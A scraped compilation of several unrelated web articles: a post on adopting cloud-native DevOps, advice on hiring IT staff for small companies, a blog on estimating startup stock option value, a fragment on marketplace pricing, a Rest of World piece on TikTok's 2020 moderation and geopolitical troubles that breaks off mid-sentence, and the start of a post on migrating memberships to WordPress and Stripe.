<p>DevOps, the method of <strong>automating processes between development and operations</strong>, is one of the essential factors of successfully implementing a cloud-native approach. Since cloud-native has a purpose to<strong> reduce go-to-market time and bring more efficiency to companies</strong>, DevOps is what streamlines individuals, tools, and systems, contributing to the overall success of the enterprise. This is what makes cloud-native DevOps a logical step towards improved productivity.&nbsp;</p>



<p>Both cloud-native and DevOps movements are on the rise. <a rel="noreferrer noopener" href="https://www.reportsanddata.com/report-detail/devops-market#:~:text=The%20global%20DevOps%20Market%20is,USD%2017.27%20Billion%20in%202027." target="_blank">Reports and Data</a> predict that <em>the global DevOps market will grow from $4.49 billion in 2019 to $17.27 billion in 2027</em>.&nbsp;</p>



<p>What is more, <a rel="noreferrer noopener" href="https://microtica.com/devops-covid-19-pandemic/" target="_blank">the COVID-19 pandemic significantly influenced cloud adoption</a>. <a href="https://www.techrepublic.com/article/idc-worldwide-it-predictions-for-2021-that-cios-need-to-know/#:~:text=There%20will%20be%20a%20dramatic,affect%20the%20enterprise%20by%202023.">Predictions</a> say that by the end of 2021, <strong>80% of companies will double the adoption of cloud-centric infrastructure and apps</strong>. This is mainly due to the shift to a remote-first workforce.&nbsp;&nbsp;</p>



<p>A cloud-native DevOps approach maximizes agility with continuous deployment. Moreover, it scales up systems and applications without the need for drastic changes.</p>



<p><em>Let’s dive in and see what this approach really means.&nbsp;</em></p>



<h2>What is the cloud-native approach to software development?&nbsp;</h2>



<p>Adopting the cloud-native approach means embracing many new options for leveraging innovations. <em>The primary tools cloud-native teams use are offered by the cloud instead of on-premise infrastructure.&nbsp;</em></p>



<p>Cloud-native applications are <strong>agile, adaptable, robust, and easy to monitor.</strong> This means that teams build them with frequent and quick deployments and iterations. Instead of preventing failure, they embrace it and have <strong>the ability to improve in real-time</strong>. </p>



<p>Furthermore, they don’t rely on external factors when it comes to monitoring. Instead, the application can be controlled from the inside.&nbsp;</p>



<p>The cloud-native beginnings date from around ten years ago, when a group of tech leaders introduced it to the public. <a href="http://pzf.fremantle.org/2010/05/cloud-native.html" target="_blank" rel="noreferrer noopener">This blog post</a> by Paul Fremantle,  VP of Technical Product Strategy at Weaveworks, is among the first related articles. In the post, he claims that applications should be written FOR the cloud to behave well ON the cloud.&nbsp;</p>



<p>Then, in 2015, Matt Stine, Executive Director at JPMorgan Chase, cleared the cloud-native concept in his book <a href="https://www.oreilly.com/library/view/migrating-to-cloud-native/9781492047605/" target="_blank" rel="noreferrer noopener"><em>Migrating to Cloud-Native Application Architectures</em></a><em>.&nbsp;</em></p>



<p>Now,<strong> the cloud-native umbrella covers many tools and methods, including microservices, containers, CI/CD, multi-cloud</strong>, etc. <a href="https://landscape.cncf.io/" target="_blank" rel="noreferrer noopener">The CNCF Cloud Native Interactive Landscape</a> provides a great overview of most of the tools used in the cloud-native approach.&nbsp; To help and provide development communities with good alternatives for building cloud-native applications, the CNCF cultivates this landscape of open source tools.</p>



<h2>What is cloud-native DevOps?&nbsp;</h2>



<p>If we combine the two definitions, cloud-native DevOps turns into <strong>a set of practices that consists of constant development, automated actions, and cross-functional teams,</strong> which result in improving the entire experience of the end-user. Cloud-native DevOps is all about <strong>making your company more flexible.</strong> You achieve this through technologies like Kubernetes and containers, which can automate processes and make applications more scalable.&nbsp;</p>



<p>All these practices apply to almost every aspect of the company. This means changing the entire culture which involves tools, people, and processes. When it comes to <strong>culture, </strong>you need to <a href="https://microtica.com/want-to-move-from-ops-to-devops-here-is-what-you-should-know/" target="_blank" rel="noreferrer noopener">adopt a DevOps-oriented approach</a>. This will foster better alignment between people and tools. </p>



<p>You have to motivate your employees to collaborate more effectively, encouraging a faster feedback circle. Faster feedback will enable quick iterations and real-time improvements. </p>



<p>You’ll also have to make some <strong>technical changes</strong>. This refers to adopting technologies that are in the center of cloud-native DevOps, such as containerization and microservices.&nbsp;</p>

<h2>How to get started with cloud-native DevOps?&nbsp;</h2>



<p>These are the options to get started with a cloud-native strategy:&nbsp;</p>



<ol><li>Implementing a cloud-first strategy by choosing a cloud provider instead of an on-premises one</li><li>Adopting a multi-cloud strategy if it meets business needs more closely</li><li>Embracing DevOps, which is obviously what we’re going to focus on further in this post.&nbsp;</li></ol>



<p>When companies realize that agile development requires both automation and culture transformation to produce quality applications faster, DevOps becomes a priority. Handling multiple hybrid environments or streamlining infrastructure stuff can get very complicated. That’s why the popularity of tools that align cloud-native and DevOps processes is rising rapidly.&nbsp;</p>



<p>To make the implementation of cloud-native DevOps easier, these are some things you should pay attention to:&nbsp;</p>



<ul><li><strong>Containerization</strong> enables the creation of environment-agnostic software. It also eliminates implementation conflicts between developers and operation departments, enabling developers and testers to communicate easier.</li><li><strong><a href="https://microtica.com/why-transition-from-monolith-to-microservices/" target="_blank" rel="noreferrer noopener">Going from monolith to microservices</a> </strong>also makes the company more agile. This establishes a set of tools, terms, and processes for both development and operation teams. With microservices, you get sophisticated process automation and an easier transition towards agile product development, which is what continuous delivery requires.</li><li><strong>Using a container orchestration platform</strong>. The most popular is Kubernetes because it solves the challenges related to underlying computing, storage, and networking.</li><li><strong>Automating CI/CD pipelines </strong>in order to reduce complexity and the chances of errors. This automation can save a lot of headaches for developers. Moreover, it allows them to focus on the actual product instead of fixing issues.&nbsp;</li><li>Writing code <strong><a href="https://12factor.net/" target="_blank" rel="noreferrer noopener">according to the 12 factors</a></strong> also makes things more transparent.</li></ul>



<h2>Most common mistakes in adopting cloud-native DevOps</h2>



<h3><strong>Using too many tools</strong></h3>



<p>Once you switch to cloud-native DevOps, you’ll try automating as many processes as possible. However, you don’t do this by just adding and adding tools. You have to pick the right tools and make the best combination that’s right for your application. Overusing tools will also cost you a lot of time and money.&nbsp;</p>



<p>Another mistake here is that developers often get too reliable of a certain tool. The essence of DevOps, however, lies in the team spirit and the implementation of correct practices that contribute to increased productivity and enhanced processes.</p>



<h3><strong>Avoiding continuous monitoring</strong></h3>



<p>While testing inside the implementation pipelines makes the things more straightforward and flowing, it also makes them limited&nbsp; and incomplete. Continuous monitoring, on the other hand, can optimize the entire process by highlighting each malfunction that happens even after the testing.&nbsp;&nbsp;&nbsp;</p>



<h3><strong>Not paying enough attention to security</strong></h3>



<p>Security checks can be quite time-consuming and costly. Teams often think of that security checking capabilities as something that is put to use within the CI/CD workflows. The implementation of a separate tool that takes care of security is a critical move for DevOps to turn and avoid any vulnerabilities in the process.</p>



<h3><strong>Making the transition too fast</strong></h3>



<p>Adopting cloud-native DevOps should be a slow process with a lot of learning on the way. Expecting a company that has been using on-premise applications to immediately align all their structures and platforms into a single cloud-native architecture is simply impossible. Maybe you can quickly make new cloud-native applications, but transitioning existing applications will take a while.&nbsp;</p>



<p>The best solutions would be to go step-by-step. Start by migrating applications to the cloud and continue with transitioning from monolith to microservices. Then, you can set up containers and container orchestration platforms. However, none of this will be successful unless you undergo the culture shift we talk about so much.&nbsp;</p>



<h2>To wrap things up</h2>



<p>Effective implementation of cloud-native DevOps helps businesses to market fresh technologies more rapidly, speeding up their digital transformation. Through cutting enormous cloud costs and rising efficiency and performance, the cloud-native approach has become a blessing to companies with software products. Completely relying on the potential of cloud-native DevOps, unlocks on-demand, unlimited software development powers.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>Hiring IT employees for a small company</h2>
<p>We are going to talk about a complicated topic here – hiring IT employees for a small company. Such companies may make mistakes thinking that they are not any different from bigger companies in terms of abilities, perception and/or position. However, it’s not right. The resources of big companies are much more vast and it lets them offering the conditions of work and salaries higher. A lot of people are lured by the idea of working in a big company, getting to the top, become a head of the department and see how such companies run. However, there are people who would be attracted to your company and you should organize competitive work conditions. The people at your hub are going to get the job and be proud of what they do. You need to create your own approach. Not all of the people like working in big companies. Sometimes people are tired of complicated processes and want to work more flexibly so they could see the result sooner. This possibility you need to underline when hiring. Don’t try to compete with moguls.</p>
 
<p>Here I would like to give you some basics you should be aware of when hiring to the IT dep of a small company. </p>
<h2>So, here’s what you need to pay attention first:</h2>
<ul><li>
The department should have the exact minimum of people for high performance. Huge number of employees is too expensive for small companies. You won’t have that many tasks as well. When hiring a lead avoid a person who used to (or wants to) head numerous departments. See if they want to adapt to new conditions. Otherwise you are going to get a lot of requests for hiring more people in order for them to feel more prominent (and in this case they are simply heading towards right direction for him/herself – without any consideration for the company). Try not to hire people who feel good just with a lot of employees below them. This is going to frame you a lot. However, there are some minimum requirements when it comes to the lower amount of people you need. Hire two people of each role (developers, designers…). Your business should not be at risk because of the sick days or annual holidays, not talking about dismissal.  Obviously, you can’t have two leads, but you can help your lead to raise a deputy.
</li><li>
Hire result-oriented ones. A few people have this essential quality. No matter what experience or skills a person has. Some people try to make things faster and better, the others complicate things or over research it (just in case some new framework will make their lives better). At the end the first group gets to the point faster and your company becomes more competitive on the market. The second group may consist of the smartest, but they finish late or demand a lot of effort from their management to finish at all. In order to distinguish one group from another, you need to talk to people, see their preferable working process and find out how they solved problems at their previous workplace. If you need any help in hiring people, we can assist you.
</li><li>
Business dep doesn’t care about technology stack. They care that a task can be carried out on it. In other words they don’t care if it’s written on Python, Ruby, PHP or any other language or if you’re using Postgres, Mongo etc. The most important is to make things work as they should and so the new features were brought in accordance with deadlines. This means that if you are not a professional in this area, leave the decision to your Teach Lead. That’s why you hired this person. The only advice is to avoid stack abundance on your project (i.e. a lot of various programming languages, databases etc.) – thus eventually you will need a lot of specialists with different competencies to support your project.
</li><li>
Don’t hire only leads and seniors. This is going to cost you a lot in terms of motivation and retention. You won’t have enough of difficult tasks for them and you won’t be able to give them subordinates. All this is going to demotivate them a lot.
</li></ul>
 <h2>Some typical issues with hiring people to small companies</h2>
<p>Let’s speak about typical issues with hiring people to small companies. The main issue is competition with the more prominent players on the market. It’s going to be this way, and you need to understand that every company is desperate for people (and here we are talking about the people who are able solve your problems).</p>
 
<p>So, what issues may come up when we are talking about hiring:</p>
 
<ul><li>
The salaries in IT world are growing as hell; you need to be constantly aware of this. With the pay below the market you won’t find a strong team.
</li><li>
Choose people whose wishes you can make true. In other words if a person wants to be promoted 5 times this year and you simply don’t have such a hierarchy, don’t fool with his/her expectations. At the end you’ll have a disappointed employee. If a person is looking for a big team – it’s not your perfect hire for now as well.
</li><li>
Huge corporations have a lot of perks besides the salary. Also they offer big hierarchy and a lot of people.
</li></ul>

<h2>What do you need to remember</h2>
<p>It doesn’t mean you should sit tight and throw your plans to the trash. You should just be aware of a couple of things:</p>
 
<ul><li>
Offer the real market salary – don’t try to wrap candidates around your finger. This way you are going to get demotivated employees and a bad reputation out there (and it will happen quite quickly because of online communications).
</li><li>
Prominent players are not everyone’s dream. Hierarchy and bureaucracy can make people to change the job or even avoid such companies whatsoever. Those people are your target audience. Don’t worry, this type of employees includes both strong and weak specialists, but their overall amount is not that small anyway. After hiring such people always remember to discuss all the improvements you want to implement. They may be perceived as a bureaucracy sometimes (i.e. precise planning of the tasks). Don’t worry, all the reasonable changes are going to be adopted and all the questionable ones will be pointed at. Just listen to your team.
</li><li>
Don’t play with people’s expectations. In small companies the mood of a team is important. If you have hired a person to lead two developers, he/she should lead them. If he/she doesn’t do that, give them a clear performance feedback. Another example is when you promised a bonus upon completion of a task. In this case you should give it to him/her when they have met an objective. Thus, people are going to value your company for an openness and truthfulness. It will pay you back with the motivation and high employee retention rate.
</li><li>
Motivate good employees. When we are talking about big companies, there is no time to watch every employee closely. In your case you are actually able to help a person grow, strengthen his/her motivation and wish to stay with you. It’s important to give a person the feeling of responsibility, show that they are needed. You also need to arrange the room for employees’ growth (you offer market salary, right?).
</li></ul>
 
<p>Again, if you need help with the choosing of stack or hiring people, you can always turn to the ones who have experience with that. </p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<h3>[ 2020-December-05 19:55 ]</h3>
<p>When accepting a job or working at a startup, you need to understand what startup options might be worth. In this article, I'll describe the simple models I use. I learned about options during the 7 years of my career running a startup (failed), then working for one (still doing well!). Stock options are a complicated subject, and I will not explain anything other than how I personally estimate their value. My advice is probably wrong. Like any financial decision, you should research your choices carefully. If you want to understand startup stock options in depth, I recommend the book <a href="https://www.venturedeals.com/">Venture Deals: Be smarter than your lawyer and your venture capitalist</a>.</p>

<h2>Trivial model: Your options are worthless</h2>

<p>Assume your stock options are worth $0. If this is true, will you still take the job, or stay with your employer? If the answer is no, I recommend looking for other jobs. There are many, many ways that startup stock will become worthless. The company can go bankrupt. It can have financial trouble, and dilute existing investors in order to raise money (research: "down round"). It can be purchased for a small enough amount of money that investors get all of it (research: "liquidation preference"). It can continue to exist for a long time, either as an independent company, or be acquired by another private company for stock. The average outcome for a startup is that it is worth $0, since most startups fail. You should estimate how likely you think this is, based on what you know about the company. However, you should be pessimistic, since even high-flying companies can run into challenges (e.g. WeWork, Theranos, and many, many others). I like to assume that even good startups have at least a 50% chance of being effectively worth $0.</p>

<p>This does not mean you should never consider working for a startup. However, I think you reasons other than the potential financial reward. The reliable way to earn a lot of money in the software industry, at least for the last 20-30 years, is to work at a big publicly traded software company. However, small companies have other advantages. Working at a small company gives you more responsibility and an environment with a higher rate of change. In the best startups, this means you can learn different skills, and might learn at a faster rate than at a large company. More specifically, I think that startups provide much better insight into how businesses work. You will get more exposure to important concepts like revenue, cost of good sold, and the cost to acquire customers. At large companies, other job functions are very remote, so you are isolated from having to know anything about them.</p>

<p>As a personal disclosure, at the time of writing, I am working at Datadog, which I consider a big company. However, working at startups taught me an enormous amount about the business of software. I do not regret my choices, even though I likely would have made more have working at Google, Twitter, or any other publicly traded company. (Although that could still change! Come on <a href="https://www.bluecore.com/">Bluecore</a>, I'm rooting for you!) I would also consider working for another startup, or even starting my own again at some point in the future.</p>

<h2>Financial model: Value the company</h2>

<p>The next approach is to estimate how valuable the company is. You can then compute your stock value = (company value)×(ownership fraction). This is very hard, and professional investors make or break their careers on their ability to do this. However, even a simple model is useful, as long as you recognize that it is probably wrong. I like to assume that I have a 50% chance of the stock being worth $0, a 40% chance of getting the money I use to exercise the options back, and a 10% chance of the stock being worth something. This means that my risk-adjusted "expected value" of the stock is approximately 1/10th the estimated value. Another way of saying this is you should believe that your options have some chance at being worth 10× what you will pay to exercise them. If this sounds crazy, you should walk. Again, you should adjust the chance of the stock being worth something based on your opinion of the company, since every company is different. But again, be pessimistic! It is easy to be sentimental for companies that you have worked for, or where you know employees personally.</p>

<p>To compute the ownership fraction, you should ask the company for the total number of outstanding shares, including the options pool. Private companies are sometimes hesitant to provide this information. If they don't want to divulge, I like to tell them that means I have to assume the stock is worthless when comparing their offer to other companies. This should motivate them to share some information, or you should take a job elsewhere. It is a bad sign if your employer lacks transparency for a basic thing like company value.</p>

<p> The numbers I like to use to estimate the company value are:</p>

<ul>
<li><strong>Last 409a valuation</strong>: The 409a valuation is an IRS requirement, and is the "fair market value" of common stock, based on <a href="https://carta.com/blog/what-is-a-409a-valuation/#jumpto6">a number of evaluation methodologies</a>. I think of this as a "low" estimate. It is supposed to be approximately what an investor would pay for a share of common stock, at the time of the estimate. The company is either worth more than this in the future, or it is worth $0. This mean you should consider a range of values, based on your opinion of how fast the company is growing (e.g. maybe 1×, 2×, 5×, 10×?). If you are a current employee, this number should be available to you, since you need it for tax purposes if you exercise your options.</li>

<li><strong>Last round valuation</strong>: At the last round of investment, professional investors believed they could earn a profit by buying shares at this price. In one way, this is a low estimate because it was made some time in the past. You can only sell the shares in the future, if the company has grown and is more valuable. However, this is also a high estimate because as an employee you have common shares, while investors have preferred shares. Preferred shares are less risky because they typically have a liquidation preference, so therefore are worth more.</li>

<li><strong>Multiple of annual recurring revenue (ARR)</strong>: A rough way to value companies, particularly SaaS companies, is to assume they are worth some multiple of their revenue. <a href="https://tomtunguz.com/valuation_multiples_2020-03-02/">An evaluation of public company SaaS revenue multiples in March 2020</a> showed that the average public SaaS company has a valuation that is about 6-8× their ARR. However, the faster the growth, the higher the valuation, so it ranges from 30× to 1×. You should calculate a range of values, based on how fast you think the company is growing.</li>

<li><strong>Comparable acquisitions/fundraising (high)</strong>: If you know of similar or competing businesses that have recently raised money or have been acquired, you can use their valuations. You will need to scale them to match the size of the company and to adjust for differences in their businesses. This is complicated because no two businesses are the same, and you need to know about comparable events. I usually don't bother with this, unless you know of something relevant.</li>
</ul>


<h2>Regret minimization</h2>

<p>After I have some rough idea of what the company might be worth, I like to imagine how I will feel in the future in two scenarios:</p>

<ul>
<li>The stock is worth $0, and I exercised my options or accepted the job: How bad will I feel about losing this money, or about the other job opportunities I passed up?</li>
<li>The stock is worth something, and I did not exercise my options or passed on the job: How bad will I feel hearing about how much money I could have made?</li>
</ul>

<p>I find it useful to think about what choices I will regret the least. Avoiding regret is why I usually advise people leaving a startup to exercise some of their options (e.g. $100-1000), even if they think the company is not doing well. If I walked away from options after working at a company for some time, then later learned those options would have been worth something, I would be very annoyed at myself. If you own at least a token amount, you can share in any potential future success, while limiting the amount you might lose.</p>

That didn’t allow me to expand and experiment on that front a lot.</p><p>While transparent, it’s also a fee structure that hurts to see. Frequently I would get messages why after all fees a mentor would only receive $78 out of their $100 price tag.</p><p>So, I ran a wide migration that would give mentors 100% of what they wanted to charge and put my own fees on top. On one side, that made the prices go a little higher, but would give me a change to experiment with that cut, run promotions, try and round to $xx9 instead of $xx0, all without adjusting the partner agreement.</p><p><strong>So, let’s stop with the anecdotes. Pricing changes in the right direction are worth it, but how are they done right?</strong></p><p>1) If you are building something new, my advice would be to choose a structure that does not limit your freedom. Agree on a flat fee with your suppliers, then experiment with whatever fee or pricing you put on top.</p><p>If you work on something where pricing changes require you to change partner agreements, work on one last migration that will get you away from that.</p><p>2) If you do need to change partner agreements, provide an option to be grandfathered or opt out. For example, a few months into operations, we started to provide a 7-day trial at MentorCruise. Three mentors opted out, but were later convinced by the far more superior numbers.</p><p>3) Look into non-commission based pricing schemes. For example, sites like MicroAcquire charge a subscription for access and a lot of the revenue of ebay comes from advertising.</p><p>4) Communicate! Pricing changes that are visible to suppliers will always produce customer support load, be braced for it.</p><p>Going for a marketplace structure should not limit the decisions you can take around pricing.</p><p>Instead, they should be a tool you can utilize to get more high-quality leads to your suppliers and hopefully more money in everyone’s pockets.</p><p>As you can see, even for marketplace getting to the right pricing scheme is immensely valuable!</p></div></div>]]>

December 7, 2020 | https://restofworld.org/2020/the-year-of-tiktok/ | <a href="https://web.archive.org/web/*/https://restofworld.org/2020/the-year-of-tiktok/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			
<p><span>O</span>n May 22, a young woman in Cairo named Aya Khamees uploaded a video to <a href="https://restofworld.org/2020/do-you-even-tiktok-tiktok/">TikTok</a> that would alter the course of her life. The 18-year-old was already a small-time star on the social media platform, where she posted singing and dancing clips under the name Menna Abdel Aziz. In the <a href="https://www.bbc.com/arabic/tv-and-radio-52799921">video</a>, which is no longer available on the app, Khamees appears to have a black eye, and the right side of her face is scratched. Looking into the camera, she recounts how she was beaten and brutally raped at a party, as her attackers filmed the acts. “If the government is watching, I want them to go out and get me my rights,” she says.</p>



<p>The clip quickly went viral. Police later arrested everyone who attended the gathering, including Khamees, <a href="https://www.nytimes.com/2020/10/30/world/middleeast/egypt-rape-assault-women-metoo.html"><em>The New York Times</em></a> reported. She was charged with drug use, prostitution, and violating “family values.” On social media, a flood of supporters began <a href="https://egyptianstreets.com/2020/09/18/prosecution-orders-release-of-tik-tok-girl-menna-abdulaziz/">using hashtags</a> like #حق<em>منه</em>عبدالعزيز (It’s Menna Abdel Aziz’s right), sparking a reckoning in Egypt over how the country treats victims of sexual violence. After the case received widespread attention and Khamees completed a rehabilitation program, the charges against her were dropped. But her experience is <a href="https://www.accessnow.org/egypt-women-jailed-for-tiktok/">far from an anomaly</a>.&nbsp;</p>



<p>Since April, Egyptian authorities have arrested at least ten female TikTok influencers for violating draconian internet laws, according to <a href="https://www.amnesty.org/en/latest/news/2020/08/egypt-survivors-of-sexual-violence-and-online-abuse-among-prosecuted-women-tiktok-influencers/">Amnesty International</a>. The troubling incidents are a reflection of Egypt’s conservative, male-dominated government, but they are also an extreme example of the political and content moderation challenges that TikTok is facing around the world. TikTok is owned by the Chinese tech giant ByteDance, and according to Egyptian <a href="https://www.almasryalyoum.com/news/details/2024299">media</a>, the Chinese ambassador informed Egyptian officials that it respected the country’s decisions in the cases and would remove illegal content in the future.</p>



<p>Over the past two years, TikTok has quickly grown into a global sensation. Roughly <a href="https://www.cnbc.com/2020/08/24/tiktok-reveals-us-global-user-growth-numbers-for-first-time.html">700 million</a> people now use the platform each month. The app has been installed close to 940 million times in 2020, up 30% from 2019, according to estimates from the market research firm Sensor Tower. Some turn to TikTok for entertainment or distraction, but others are increasingly using it to push boundaries, shaping the future of digital culture in the process.</p>



<p>Their fate depends on whether TikTok will effectively manage the massive community it has built or, instead, make the same mistakes its predecessors did when it comes to free speech, misinformation, and safety. I’ve spent the better part of the past 18 months covering TikTok as a reporter at <em>Wired, </em>and now as an editor at <em>Rest of World. </em>After a while, I came to realize that the company faces three related problems, all of which will be familiar to anyone who has followed Google or Facebook over the past decade. The difference is that TikTok may be less equipped to handle them.</p>



<p>The first problem is related to content moderation and trust. When TikTok began exploding in popularity in 2018, its website listed a short set of rules banning extreme forms of behavior, such as violence and pornography. Facebook, meanwhile, has long had extensive community guidelines covering hundreds of scenarios (though they’re <a href="https://restofworld.org/2020/pressing-pause-on-fake-news-in-myanmar/">far from</a> totally effective). TikTok has <a href="https://www.wired.com/story/tiktok-overhauls-community-guidelines/">strengthened</a> its policies <a href="https://www.nytimes.com/2020/10/21/technology/tiktok-qanon.html">several times</a> in the past two years, prohibiting hate speech and limiting the spread of <a href="https://www.npr.org/2020/10/18/925144034/tiktok-tightens-crackdown-on-qanon-will-ban-accounts-that-promote-disinformation">conspiracy theories</a> like QAnon. But these improvements came only after it had weathered a series of damaging scandals over censorship.</p>



<p>In its early days, TikTok <a href="https://www.theguardian.com/technology/2019/sep/25/revealed-how-tiktok-censors-videos-that-do-not-please-beijing">said</a> that the company “took a blunt approach to minimizing conflict on the platform,” penalizing users for discussing controversial topics, like tensions between ethnic or religious groups. The company appeared determined to avoid any chance of controversy. (It often claimed its mission was to “<a href="https://www.wsj.com/articles/tiktok-wants-to-stay-politics-free-that-could-be-tough-in-2020-11578225601">bring joy</a>” rather than, say, host political discussions.) That strategy may have been an extension of how ByteDance is forced to operate in China, where it runs a domestic version of TikTok, as well as other widely used social media platforms.&nbsp;</p>



<p>Internet companies in China are required to abide by broad and ever-changing guidelines regarding the types of speech that must be censored. A few years ago, the Chinese government cracked down on ByteDance, accusing it of hosting salacious material, including videos of teen mothers glamorizing their pregnancies. CEO Zhang Yiming quickly <a href="https://www.newyorker.com/news/daily-comment/why-china-cracked-down-on-the-social-media-giant-bytedance">apologized</a> and promised that his company would do a better job policing users in the future.</p>



<p>Media outlets like <em>The Guardian </em>later reported that TikTok had instructed moderators to blacklist videos advocating for <a href="https://www.theguardian.com/technology/2019/sep/26/tiktoks-local-moderation-guidelines-ban-pro-lgbt-content">gay rights</a> and featuring <a href="https://www.theguardian.com/technology/2019/sep/25/revealed-how-tiktok-censors-videos-that-do-not-please-beijing">topics sensitive</a> to Beijing, including Tibetan independence. In March, <em>The Intercep</em>t <a href="https://theintercept.com/2020/03/16/tiktok-app-moderators-users-discrimination/">revealed</a> that TikTok had suppressed posts from “ugly” and poor users, allegedly in an attempt to stem bullying. TikTok said that the guidelines were outdated, but it still looked as though the company had copied and pasted policies from China to the rest of the world.</p>



<p>The fallout was disastrous: Users and journalists <a href="https://www.washingtonpost.com/technology/2019/09/15/tiktoks-beijing-roots-fuel-censorship-suspicion-it-builds-huge-us-audience/">accused</a> TikTok of censoring other content that might upset the Chinese government, such as protests in Hong Kong and a video <a href="https://www.theverge.com/2019/11/28/20986867/tiktok-unblock-us-teen-china-criticism-muslim-minority-terrorist-imagery-moderation-guidelines">that raised awareness</a> about China’s internment camps for <a href="https://restofworld.org/2020/counter-surveillance-revolution/">Muslim minorities</a> (TikTok denied the claims). In response to growing suspicion from users and government officials, the company spent much of 2020 trying to <a href="https://www.wired.com/story/tiktok-under-scrutiny-china/">move away</a> from China and remodel itself as a <a href="https://www.tiktok.com/transparency?lang=en">global social media company</a>.&nbsp;</p>



<p>Its efforts have included releasing <a href="https://www.wired.com/story/tiktok-first-transparency-report/">regular reports</a> about state requests for video removals, which indicated it had never received any from Beijing. It also opened a <a href="https://www.theverge.com/interface/2020/9/11/21430822/tiktok-transparency-visit-tour-algorithms-for-you-page">transparency and accountability center</a> where people can witness TikTok’s moderation practices up close. But it’s not clear whether these changes are enough to convince people that TikTok isn’t influenced by its home country. The app is the first social media platform from China to become a truly global success, but its rise comes as residents of many Western nations <a href="https://www.pewresearch.org/global/2020/10/06/unfavorable-views-of-china-reach-historic-highs-in-many-countries/">increasingly</a> view the country’s government unfavorably.</p>

<p>There’s another reason TikTok may be struggling to earn people’s trust: The way the platform is designed. TikTok is the only major social media app driven almost exclusively by artificial intelligence. Instagram and Twitter have also embraced algorithmic curation but are still largely oriented around whom you know or choose to follow. When you open TikTok, you’re greeted by the platform’s central feature, the For You page — an endless stream of videos chosen by an algorithm. What you see is determined by your previous behavior, along with <a href="https://www.wired.com/story/tiktok-finally-explains-for-you-algorithm-works/">other factors</a>, such as the country you’re in and the device you’re using.</p>



<p>The app <a href="https://www.wired.com/story/tiktok-time/">encourages</a> passive consumption, allowing the For You page to determine your preferences, well, for you. There’s no need to follow specific accounts or seek out particular kinds of content (though you certainly can). “That makes the structure and priorities of the algorithm even more important, as it increasingly determines what we watch, read, and hear, and what people are incentivized to create in digital spaces to get attention,” the writer Kyle Chayka wrote in a <a href="https://kylechayka.substack.com/p/essay-how-do-you-describe-tiktok">recent essay</a> about TikTok.&nbsp;</p>



<p>The For You page has proved to be a potent vehicle for creating <a href="https://www.rollingstone.com/pro/features/tiktok-video-app-growth-867587/">hit songs</a> and viral memes as well as for launching the careers of new celebrities. But its inner workings are still largely opaque. It’s hard for users to know what’s actually on the app, or what they might be missing. More than almost any other platform, TikTok may be inadvertently pushing its users into separate spheres, and there are fewer avenues for them to discover when and if that’s happening. (TikTok <a href="https://www.axios.com/inside-tiktoks-killer-algorithm-52454fb2-6bab-405d-a407-31954ac1cf16.html">has said</a> it’s studying the issue.)&nbsp;</p>



<p>The risk is that TikTok will make political polarization worse, directing users to more and more extreme content. “I think algorithmic feeds are playing a big role in the perpetuation and amplification of disinformation,” said Benjamin Grosser, an artist and a professor of new media at the University of Illinois at Urbana-Champaign. His recent project is <a href="https://bengrosser.com/projects/not-for-you/">Not For You</a>, a browser extension that deliberately tries to confuse TikTok’s For You page in order to surface content you might not otherwise see. The signals the plug-in sends are random, but after playing with it for a while, Grosser said he noticed that TikTok consistently promoted videos from the same handful of popular creators. TikTok’s algorithm is a powerful tool for producing culture, and it may be biased in ways that are independent of its users’ preferences.</p>



<hr>



<p>The most obvious challenge TikTok must confront is that governments around the globe simply don’t like it. After a clash broke out along the border between India and China, Indian authorities <a href="https://restofworld.org/2020/the-clock-is-tik-tok-tik-tok/">blocked TikTok</a> along with hundreds of other apps made by Chinese developers. In the United States, the Trump administration similarly moved to ban the platform amid rising tensions with China; the company is <a href="https://www.reuters.com/article/us-usa-tiktok/appeals-court-holding-dec-14-hearing-on-blocked-u-s-tiktok-new-user-ban-idUSKBN28C2VO">still entangled</a> in a complicated legal battle in U.S. courts. Pakistan also <a href="https://restofworld.org/2020/who-is-afraid-of-a-meme/">briefly censored</a> TikTok, though it quickly reversed the decision.</p>



<p>American companies like Facebook and Twitter frequently find themselves banned by repressive regimes. But rarely are they used as a scapegoat for their country of origin. TikTok will likely continue struggling to dissociate itself from ByteDance and China, especially as other nations <a href="https://www.reuters.com/article/us-eu-privacy-tiktok-clearview/eu-watchdog-sets-up-tiktok-task-force-warns-on-clearview-ai-software-idUSKBN23H2PM">begin scrutinizing</a> the company. And Beijing <a href="https://www.scmp.com/economy/china-economy/article/3101362/tiktoks-algorithm-not-sale-bytedance-tells-us-source">has signaled</a> that it’s willing to step in if ByteDance makes any moves it disapproves of, like selling TikTok to an American company, as the Trump administration has demanded.</p>



<p>Aside from the world’s biggest superpowers, TikTok will need to navigate thorny relationships with leaders from a slew of other nations where it’s quickly gaining millions of new users. Its stated values will likely be tested. Two years ago in Indonesia, for example, the government <a href="https://www.reuters.com/article/us-indonesia-bytedance/indonesia-overturns-ban-on-chinese-video-app-tik-tok-idUSKBN1K10A0">reportedly</a> …</p></div></div>

        <p><strong>NOTE: Although I am a Stripe employee, this is my personal blog. None of what I will describe has an official recommendation from Stripe. Additionally, if you follow me down this migration path, ensure that you do so in a manner that is compliant with the</strong> <a href="https://www.pcisecuritystandards.org/document_library"><strong>PCI Data Security Standard (PCI DSS)</strong></a><strong>.</strong></p>

<p>In <a href="https://dev.clintonblackburn.com/2020/11/28/under-the-hood-of-mitcnc.org.html">my last post</a> I provided an overview of the changes I’ve made to mitcnc.org. This post details the work done to migrate our annual memberships from iModules+Cybersource to WordPress+Stripe.</p>

<p>Prior to the migration I wrote a <a href="https://gitlab.com/mitcnc/wordpress-stripe-plugin">WordPress Stripe plugin</a> to integrate with <a href="https://stripe.com/payments/checkout">Checkout</a> and the <a href="https://stripe.com/docs/billing/subscriptions/customer-portal">customer portal</a>, and render a membership level page. Our membership levels (e.g., Sustaining for $50, or Patron for $100) are pretty straightforward. Each level is modeled as a product with at least one price. The WordPress plugin allows us to determine which prices will be displayed to members at checkout time. A separate plugin—that is more specific to the needs of MITCNC, so not part of the plugin linked above—utilizes filters from the Stripe plugin to apply a discount for recent graduates, and render a lifetime membership level for members of the Cardinal &amp; Gray Society (graduates of 50+ years).</p>

